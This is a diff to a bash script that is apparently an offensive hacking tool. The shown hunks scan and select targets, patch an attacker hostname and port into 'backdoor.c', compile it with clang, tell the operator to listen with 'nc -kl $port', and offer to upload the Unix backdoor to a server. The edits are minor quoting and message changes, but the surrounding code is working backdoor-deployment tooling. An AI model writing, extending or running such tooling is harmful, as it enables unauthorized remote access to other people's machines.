@@ -67,7 +67,7 @@ scan_targets() {
             if [[ $answer == *","* ]]; then
                 target_number=($(echo "$answer" | tr ',' '\n'))
                 for i in "${!target_number[@]}"; do
-                    if [[ ${array[@]} =~ ${array[${target_number[$i]}]} ]]; then
+                    if [[ "${array[@]}" =~ ${array[${target_number[$i]}]} ]]; then
                         target+="${array[${target_number[$i]}]}"
                         if (( i+1 < "${#target_number[@]}" )); then
                             target+=","
@@ -180,7 +180,7 @@ EOF
             sed -i '' 's/$hostname/'"$hostname"'/;s/$port/'"$port"'/' backdoor.c
             clang backdoor.c -o executable || abort "Could not compile backdoor"
             echo -e "[${green}+${white}] Backdoor is at $PWD..."
-            echo -e "[${yellow}i${white}] Run 'nc -kl 4321'..."
+            echo -e "[${yellow}i${white}] Execute it and run nc -kl $port on the server..."
             read -p "[${yellow}Y/n${white}] Wanna upload payload on the server? " answer
             if [[ ! $answer || $answer =~ ^[yY] ]]; then
                 read -p "Hostname to upload Unix backdoor: " hostname
